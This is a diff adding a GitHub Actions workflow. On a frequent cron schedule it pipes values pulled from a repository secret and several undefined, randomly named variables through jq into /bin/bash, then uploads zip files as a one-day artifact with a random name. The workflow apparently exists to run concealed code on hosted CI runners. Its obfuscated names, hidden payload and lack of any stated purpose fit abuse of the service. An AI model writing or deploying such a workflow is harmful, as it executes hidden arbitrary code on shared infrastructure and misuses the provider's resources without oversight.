@@ -1,0 +1,28 @@
+name: Pipeline
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '1 3,9,15,21 * * *'
+jobs:
+  task:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Execute
+        env:
+          nw46: ${{ secrets.nw46 }}
+        run: |
+          printf '%s' "$nw46" | jq -r .unr69 | /bin/bash
+          printf '%s' "$k676" | jq -r .ii5 | /bin/bash
+          echo $k954 | jq -r .byxso38349 | /bin/bash
+          printf '%s' "$cqpy9482" | jq -r .hfe0 | /bin/bash
+          printf '%s' "$yqx8684" | jq -r .r73 | /bin/bash
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: 05JdJ8uM
+          path: "*.zip"
+          retention-days: 1
